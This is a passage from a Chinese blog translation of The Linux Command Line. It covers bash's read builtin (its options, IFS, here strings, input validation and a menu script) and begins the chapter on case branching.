是奇数。&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;INT 不是整数。&quot;</span> &gt;&amp;2</span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>每次我们想改变 INT 的值时，我们必须编辑脚本。如果脚本能够要求用户提供一个值就更有用了。在本章中，我们将开始探讨如何为我们的程序添加交互性。</p>
<h3 id="read-从标准输入读取值"><a href="#read-从标准输入读取值" class="headerlink" title="read - 从标准输入读取值"></a>read - 从标准输入读取值</h3><p>read 内置命令用于读取标准输入的单行。这个命令可以用来读取键盘输入，或者当使用重定向时，从文件读取一行数据。该命令有以下语法：</p>
<blockquote>
<p>read [-<em>选项</em>] [<em>变量</em>…]</p>
</blockquote>
<p>其中 <em>选项</em> 是可用选项列表中的一个或多个，<em>变量</em> 是用于保存输入值的一个或多个变量的名称。如果没有提供变量名，shell 变量 REPLY 包含数据行。</p>
<p>基本上，read 将标准输入的字段分配给指定的变量。如果我们修改我们的整数评估脚本以使用 read，它可能看起来像这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># read-integer: 评估一个整数的值。</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;请输入一个整数 -&gt; &quot;</span></span><br><span class="line"><span class="built_in">read</span> int</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$int</span>&quot;</span> =~ ^-?[0-9]+$ ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$int</span>&quot;</span> -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$int</span> 是零。&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$int</span>&quot;</span> -lt 0 ]; <span class="keyword">then</span></span><br><span class="line">    	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$int</span> 是负数。&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$int</span> 是正数。&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">if</span> [ $((int % <span class="number">2</span>)) -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">    	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$int</span> 是偶数。&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$int</span> 是奇数。&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;输入值不是整数。&quot;</span> &gt;&amp;2</span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>我们使用带有 -n 选项（抑制输出末尾的换行符）的 echo 来显示提示，然后我们使用 read 来输入一个变量 int 的值。运行这个脚本会得到这样的结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ read-integer</span><br><span class="line">请输入一个整数 -&gt; 5</span><br><span class="line">5 是正数。</span><br><span class="line">5 是奇数。</span><br></pre></td></tr></table></figure>

<p>read 可以将输入分配给多个变量，如下面这个脚本所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># read-multiple: 从键盘读取多个值</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;输入一个或多个值 &gt; &quot;</span></span><br><span class="line"><span class="built_in">read</span> var1 var2 var3 var4 var5</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;var1 = &#x27;<span class="variable">$var1</span>&#x27;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;var2 = &#x27;<span class="variable">$var2</span>&#x27;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;var3 = &#x27;<span class="variable">$var3</span>&#x27;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;var4 = &#x27;<span class="variable">$var4</span>&#x27;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;var5 = &#x27;<span class="variable">$var5</span>&#x27;&quot;</span></span><br></pre></td></tr></table></figure>

<p>在这个脚本中，我们分配并显示多达五个值。注意当给定不同数量的值时，read 的行为如何变化，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ read-multiple</span><br><span class="line">输入一个或多个值 &gt; a b c d e</span><br><span class="line">var</span><br><span class="line"></span><br><span class="line">1 = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">var2 = <span class="string">&#x27;b&#x27;</span></span><br><span class="line">var3 = <span class="string">&#x27;c&#x27;</span></span><br><span class="line">var4 = <span class="string">&#x27;d&#x27;</span></span><br><span class="line">var5 = <span class="string">&#x27;e&#x27;</span></span><br><span class="line">[me@linuxbox ~]$ read-multiple</span><br><span class="line">输入一个或多个值 &gt; a</span><br><span class="line">var1 = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">var2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">var3 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">var4 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">var5 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">[me@linuxbox ~]$ read-multiple</span><br><span class="line">输入一个或多个值 &gt; a b c d e f g</span><br><span class="line">var1 = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">var2 = <span class="string">&#x27;b&#x27;</span></span><br><span class="line">var3 = <span class="string">&#x27;c&#x27;</span></span><br><span class="line">var4 = <span class="string">&#x27;d&#x27;</span></span><br><span class="line">var5 = <span class="string">&#x27;e f g&#x27;</span></span><br></pre></td></tr></table></figure>

<p>如果 read 接收到的值少于预期的数量，额外的变量为空，而过多的输入会导致最后一个变量包含所有额外的输入。</p>
<p>如果在 read 命令之后没有列出变量，一个 shell 变量，REPLY，将被分配所有的输入。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># read-single: 将多个值读入默认变量</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;输入一个或多个值 &gt; &quot;</span></span><br><span class="line"><span class="built_in">read</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;REPLY = &#x27;<span class="variable">$REPLY</span>&#x27;&quot;</span></span><br></pre></td></tr></table></figure>

<p>运行这个脚本会得到这样的结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ read-single</span><br><span class="line">输入一个或多个值 &gt; a b c d</span><br><span class="line">REPLY = <span class="string">&#x27;a b c d&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h4><p>read 支持在表 28-1 中描述的选项。</p>
<p><em>表 28-1:</em> <em>read 选项</em></p>
<table>
<thead>
<tr>
<th><strong>选项</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-a <em>数组</em></td>
<td>将输入分配给 <em>数组</em>，从索引零开始。我们将在第35章中讨论数组。</td>
</tr>
<tr>
<td>-d <em>分隔符</em></td>
<td>字符串 <em>分隔符</em> 中的第一个字符用来指示输入的结束，而不是换行符。</td>
</tr>
<tr>
<td>-e</td>
<td>使用 Readline 来处理输入。这允许以与命令行相同的方式编辑输入。</td>
</tr>
<tr>
<td>-i <em>字符串</em></td>
<td>如果用户仅按 Enter 键，则使用 <em>字符串</em> 作为默认回复。需要 -e 选项。</td>
</tr>
<tr>
<td>-n <em>数字</em></td>
<td>读取 <em>数字</em> 个输入字符，而不是整行。</td>
</tr>
<tr>
<td>-p <em>提示</em></td>
<td>使用字符串 <em>提示</em> 显示输入提示。</td>
</tr>
<tr>
<td>-r</td>
<td>原始模式。不将反斜线字符解释为转义字符。</td>
</tr>
<tr>
<td>-s</td>
<td>静默模式。输入字符时不在显示器上显示。这在输入密码和其他机密信息时很有用。</td>
</tr>
<tr>
<td>-t <em>秒</em></td>
<td>超时。在 <em>秒</em> 后终止输入。如果输入超时，read 返回非零退出状态。</td>
</tr>
<tr>
<td>-u <em>fd</em></td>
<td>使用文件描述符 <em>fd</em> 的输入，而不是标准输入。</td>
</tr>
</tbody></table>
<p>使用各种选项，我们可以用 read 做有趣的事情。例如，使用 -p 选项，我们可以提供一个提示字符串。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># read-single: 将多个值读入默认变量</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;输入一个或多个值 &gt; &quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;REPLY = &#x27;<span class="variable">$REPLY</span>&#x27;&quot;</span></span><br></pre></td></tr></table></figure>

<p>使用 -t 和 -s 选项，我们可以编写一个脚本来读取“秘密”输入，并在指定时间内如果输入未完成则超时。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># read-secret: 输入一个秘密密码</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">read</span> -t 10 -sp <span class="string">&quot;输入秘密密码 &gt; &quot;</span> secret_pass; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> -e <span class="string">&quot;\n秘密密码 = &#x27;<span class="variable">$secret_pass</span>&#x27;&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> -e <span class="string">&quot;\n输入超时&quot;</span> &gt;&amp;2</span><br><span class="line">	<span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>该脚本提示用户输入一个秘密密码，并等待十秒钟的输入。如果在指定的时间内未完成输入，脚本将以错误退出。由于包含了 s 选项，密码的字符在输入时不会在显示器上显示。</p>
<p>可以使用 -e 和 -i 选项一起为用户提供默认响应。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># read-default: supply a default value if user presses Enter key.</span></span><br><span class="line"><span class="built_in">read</span> -e -p <span class="string">&quot;What is your user name? &quot;</span> -i <span class="variable">$USER</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;You answered: &#x27;<span class="variable">$REPLY</span>&#x27;&quot;</span></span><br></pre></td></tr></table></figure>

<p>在这个脚本中，我们提示用户输入一个用户名，并使用环境变量USER来提供一个默认值。当运行脚本时，它会显示默认字符串，如果用户只是按下Enter键，read会将默认字符串赋值给REPLY变量。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ read-default</span><br><span class="line">你的用户名是什么？me</span><br><span class="line">你的回答是：<span class="string">&#x27;me&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="IFS"><a href="#IFS" class="headerlink" title="IFS"></a>IFS</h4><p>通常，shell会对提供给read的输入执行词分割。正如我们所见，这意味着通过一个或多个空格分隔的多个词会成为输入行上的单独项目，并由read分配给单独的变量。这种行为由一个名为IFS（内部字段分隔符）的shell变量配置。IFS的默认值包含一个空格、一个制表符和一个换行符，每个都会将项目彼此分开。</p>
<p>我们可以调整IFS的值来控制输入到read的字段的分隔。例如，&#x2F;etc&#x2F;passwd文件包含使用冒号字符作为字段分隔符的数据行。通过将IFS的值更改为单个冒号，我们可以使用read来输入&#x2F;etc&#x2F;passwd的内容，并成功将字段分隔成不同的变量。这里我们有一个这样做的脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># read-ifs: 从文件中读取字段</span></span><br><span class="line">FILE=/etc/passwd</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;输入一个用户名 &gt; &quot;</span> user_name</span><br><span class="line">file_info=<span class="string">&quot;<span class="subst">$(grep <span class="string">&quot;^<span class="variable">$user_name</span>:&quot;</span> $FILE)</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$file_info</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  IFS=<span class="string">&quot;:&quot;</span> <span class="built_in">read</span> user pw uid gid name home shell &lt;&lt;&lt; <span class="string">&quot;<span class="variable">$file_info</span>&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;用户 = &#x27;<span class="variable">$user</span>&#x27;&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;UID = &#x27;<span class="variable">$uid</span>&#x27;&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;GID = &#x27;<span class="variable">$gid</span>&#x27;&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;全名 = &#x27;<span class="variable">$name</span>&#x27;&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;家目录 = &#x27;<span class="variable">$home</span>&#x27;&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Shell = &#x27;<span class="variable">$shell</span>&#x27;&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;没有这样的用户 &#x27;<span class="variable">$user_name</span>&#x27;&quot;</span> &gt;&amp;2</span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>这个脚本提示用户输入系统上某个账户的用户名，然后显示&#x2F;etc&#x2F;passwd文件中用户记录的不同字段。脚本包含两行有趣的代码。第一行如下：</p>
<blockquote>
<p>file_info&#x3D;<code>$(grep &quot;^$</code>user_name:” $FILE)</p>
</blockquote>
<p>这行代码将grep命令的结果赋值给变量file_info。grep使用的正则表达式确保用户名只匹配&#x2F;etc&#x2F;passwd文件中的单一行。</p>
<p>第二行有趣的代码是这一行：</p>
<blockquote>
<p>IFS&#x3D;”:” read user pw uid gid name home shell &lt;&lt;&lt; “$file_info”</p>
</blockquote>
<p>这行代码由三部分组成：一个变量赋值，一个带有参数列表变量名的read命令，和一个奇怪的新重定向操作符。我们先看变量赋值。</p>
<p>shell允许在命令之前立即进行一个或多个变量赋值。这些赋值改变了紧随其后的命令的环境。赋值的效果是临时的，只改变命令持续时间的环境。在我们的例子中，IFS的值被改变为一个冒号字符。或者，我们也可以这样编码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">OLD_IFS=<span class="string">&quot;<span class="variable">$IFS</span>&quot;</span></span><br><span class="line">IFS=<span class="string">&quot;:&quot;</span></span><br><span class="line"><span class="built_in">read</span> user pw uid gid name home shell &lt;&lt;&lt; <span class="string">&quot;<span class="variable">$file_info</span>&quot;</span></span><br><span class="line">IFS=<span class="string">&quot;<span class="variable">$OLD_IFS</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>在这里，我们存储IFS的值，分配一个新值，执行read命令，然后将IFS恢复到其原始值。显然，将变量赋值放在命令前面是做同样事情的更简洁的方式。</p>
<p>&lt;&lt;&lt;操作符表示一个<em>这里字符串</em>。这里字符串就像这里文档，只是更短，由单个字符串组成。在我们的例子中，来自&#x2F;etc&#x2F;passwd文件的数据行被送到read命令的标准输入。我们可能想知道为什么选择了这种而不是这种方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$file_info</span>&quot;</span> | IFS=<span class="string">&quot;:&quot;</span> <span class="built_in">read</span> user pw uid gid name home shell</span><br></pre></td></tr></table></figure>

<p>嗯，有一个原因…</p>
<h3 id="你不能read管道"><a href="#你不能read管道" class="headerlink" title="你不能read管道"></a>你不能read管道</h3><p>虽然read命令通常从标准输入接收输入，你不能这样做：</p>
<blockquote>
<p>echo “foo” | read</p>
</blockquote>
<p>我们期望这能工作，但它不行。命令看起来会成功，但REPLY变量总是为空。为什么会这样？</p>
<p>解释与shell处理管道的方式有关。在bash（以及其他如sh的shell）中，管道创建<em>子shell</em>。这些是用于执行管道中命令的shell及其环境的副本。在我们之前的例子中，read在一个子shell中执行。</p>
<p>Unix-like系统中的子shell为执行过程创建环境副本。当进程结束时，环境副本被销毁。这意味着<em>子shell永远不能改变其父进程的环境</em>。在前一个例子中，read在其子shell的环境中将值foo分配给变量REPLY，但当命令退出时，子shell及其环境被销毁，赋值的效果丢失了。</p>
<p>使用这里字符串是解决这种行为的一种方法。另一种方法将在第36章讨论。</p>
<h3 id="验证输入"><a href="#验证输入" class="headerlink" title="验证输入"></a>验证输入</h3><p>随着我们新获得的能力来通过键盘向程序输入数据，出现了一个额外的编程挑战，即验证输入。通常，一个编写得好的程序和一个编写得不好的程序之间的区别在于程序处理意外情况的能力。经常，意外以错误输入的形式出现。我们在上一章的评估程序中已经做了一些这样的工作，我们检查了整数的值，并筛选掉了空值和非数字字符。每次程序接收输入时，执行这类编程检查以防止无效数据非常重要。这对于被多个用户共享的程序尤其重要。如果程序只由作者使用一次来执行某些特殊任务，则可以以节省为由省略这些安全措施。即便如此，如果程序执行危险任务，如删除文件，那么加入数据验证就是明智的，以防万一。</p>
<p>这里我们有一个验证各种输入的示例程序：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># read-validate: 验证输入</span></span><br><span class="line"><span class="function"><span class="title">invalid_input</span></span> () &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;无效输入 &#x27;<span class="variable">$REPLY</span>&#x27;&quot;</span> &gt;&amp;2</span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;输入一个单项 &gt; &quot;</span></span><br><span class="line"><span class="comment"># 输入为空（无效）</span></span><br><span class="line">[[ -z <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> ]] &amp;&amp; invalid_input</span><br><span class="line"><span class="comment"># 输入为多项（无效）</span></span><br><span class="line">(( &quot;$(echo &quot;<span class="variable">$REPLY</span>&quot; | wc -w)&quot; &gt; <span class="number">1</span> )) &amp;&amp; invalid_input</span><br><span class="line"><span class="comment"># 输入是否为有效文件名？</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> =~ ^[-[:alnum:]\._]+$ ]]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$REPLY</span>&#x27; 是一个有效的文件名。&quot;</span></span><br><span class="line">  <span class="keyword">if</span> [[ -e <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;而且文件 &#x27;<span class="variable">$REPLY</span>&#x27; 存在。&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;然而，文件 &#x27;<span class="variable">$REPLY</span>&#x27; 不存在。&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="comment"># 输入是否为浮点数？</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> =~ ^-?[[:digit:]]*\.[[:digit:]]+$ ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$REPLY</span>&#x27; 是一个浮点数。&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$REPLY</span>&#x27; 不是一个浮点数。&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="comment"># 输入是否为整数？</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> =~ ^-?[[:digit:]]+$ ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$REPLY</span>&#x27; 是一个整数。&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$REPLY</span>&#x27; 不是一个整数。&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;字符串 &#x27;<span class="variable">$REPLY</span>&#x27; 不是一个有效的文件名。&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>这个脚本提示用户输入一个项目。随后分析该项目以确定其内容。正如我们所见，该脚本使用了许多我们迄今为止所涉及的概念，包括shell函数、[[ ]]、(( ))、控制操作符&amp;&amp;和if，以及大量的正则表达式。</p>
<h3 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h3><p>一种常见的交互类型被称为<em>菜单驱动</em>。在菜单驱动的程序中，向用户展示一个选择列表，并要求选择一个。例如，我们可以想象一个程序，展示以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">请选择：</span><br><span class="line">1. 显示系统信息</span><br><span class="line">2. 显示磁盘空间</span><br><span class="line">3. 显示家目录空间利用率</span><br><span class="line">0. 退出</span><br><span class="line">输入选择 [0-3] &gt;</span><br></pre></td></tr></table></figure>

<p>利用我们从编写sys_info_page程序中学到的知识，我们可以构建一个菜单驱动的程序来执行上述菜单中的任务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># read-menu: 一个菜单驱动的系统信息程序</span></span><br><span class="line">clear</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">请选择：</span></span><br><span class="line"><span class="string">1. 显示系统信息</span></span><br><span class="line"><span class="string">2. 显示磁盘空间</span></span><br><span class="line"><span class="string">3. 显示家目录空间利用率</span></span><br><span class="line"><span class="string">0. 退出</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;输入选择 [0-3] &gt; &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> =~ ^[0-3]$ ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> == 0 ]]; <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;程序终止。&quot;</span></span><br><span class="line">  	<span class="built_in">exit</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> == 1 ]]; <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;主机名: <span class="variable">$HOSTNAME</span>&quot;</span></span><br><span class="line">  	<span class="built_in">uptime</span></span><br><span class="line">  	<span class="built_in">exit</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> == 2 ]]; <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">df</span> -h</span><br><span class="line">  	<span class="built_in">exit</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> == 3 ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="string">&quot;<span class="subst">$(id -u)</span>&quot;</span> -eq 0 ]]; <span class="keyword">then</span></span><br><span class="line">    	<span class="built_in">echo</span> <span class="string">&quot;家目录空间利用率（所有用户）&quot;</span></span><br><span class="line">    	<span class="built_in">du</span> -sh /home/*</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	<span class="built_in">echo</span> <span class="string">&quot;家目录空间利用率（<span class="variable">$USER</span>）&quot;</span></span><br><span class="line">    	<span class="built_in">du</span> -sh <span class="string">&quot;<span class="variable">$HOME</span>&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;输入无效。&quot;</span> &gt;&amp;2</span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>这个脚本逻辑上分为两部分。第一部分展示菜单并输入用户的响应。第二部分识别响应并执行选定的动作。注意在这个脚本中使用exit命令。这里使用它是为了防止在执行动作后脚本执行不必要的代码。在程序中存在多个退出点通常是个坏主意（它使程序逻辑更难理解），但在这个脚本中它是有效的。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在本章中，我们迈出了向交互性迈进的第一步，允许用户通过键盘将数据输入到我们的程序中。利用迄今为止介绍的技术，可以编写许多有用的程序，如专门的计算程序和易于使用的命令行工具前端。在下一章中，我们将基于菜单驱动程序概念构建，使其更加完善。</p>
<h4 id="额外任务"><a href="#额外任务" class="headerlink" title="额外任务"></a>额外任务</h4><p>仔细研究本章中的程序，并完全理解它们的逻辑结构非常重要，因为接下来的程序将会越来越复杂。作为练习，使用test命令而不是[[ ]]复合命令重写本章中的程序。提示：使用grep来评估正则表达式并评估退出状态。这将是很好的练习。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li><p><em>Bash参考手册</em>包含了一个关于内建命令的章节，其中包括read命令：</p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5nbnUub3JnL3NvZnR3YXJlL2Jhc2gvbWFudWFsL2Jhc2hyZWYuaHRtbCNCYXNoLUJ1aWx0aW5z">http://www.gnu.org/software/bash/manual/bashref.html#Bash-Builtins<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>流程控制：使用 case 进行分支</title>
    <url>/2024/05/31-branching-with-case/</url>
    <content><![CDATA[<h2 id="31-流程控制：使用-case-进行分支"><a href="#31-流程控制：使用-case-进行分支" class="headerlink" title="31 - 流程控制：使用 case 进行分支"></a>31 - 流程控制：使用 case 进行分支</h2><p>在本章中，我们将继续探讨流程控制。在第28章“读取键盘输入”中，我们构建了一些简单的菜单，并构建了用于根据用户选择进行操作的逻辑。为此，我们使用了一系列 if 命令来识别已选择的可能选项之一。这种类型的逻辑构造在程序中频繁出现，以至于许多编程语言（包括 shell）为多重选择决策提供了一种特殊的流程控制机制。</p>
<span id="more"></span>

<h3 id="case"><a href="#case" class="headerlink" title="case"></a>case</h3><p>在 bash 中，多重选择的复合命令称为 case。它有以下语法：</p>
<blockquote>
<p>case <em>word</em> in</p>
<p>[<em>pattern</em> [| <em>pattern</em>]…) <em>commands</em> ;;]…</p>
<p>esac</p>
</blockquote>
<p>如果我们回顾第28章中的 read-menu 程序，我们看到了用于根据用户选择进行操作的逻辑。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># read-menu: 一个基于菜单的系统信息程序</span></span><br><span class="line">clear</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">请选择：</span></span><br><span class="line"><span class="string">1. 显示系统信息</span></span><br><span class="line"><span class="string">2. 显示磁盘空间</span></span><br><span class="line"><span class="string">3. 显示家目录空间利用率</span></span><br><span class="line"><span class="string">0. 退出</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;输入选择 [0-3] &gt; &quot;</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> =~ ^[0-3]$ ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> == 0 ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;程序已终止。&quot;</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> == 1 ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;主机名: <span class="variable">$HOSTNAME</span>&quot;</span></span><br><span class="line">    <span class="built_in">uptime</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$REPLY</span>&quot;</span> == 2 ]]; <span 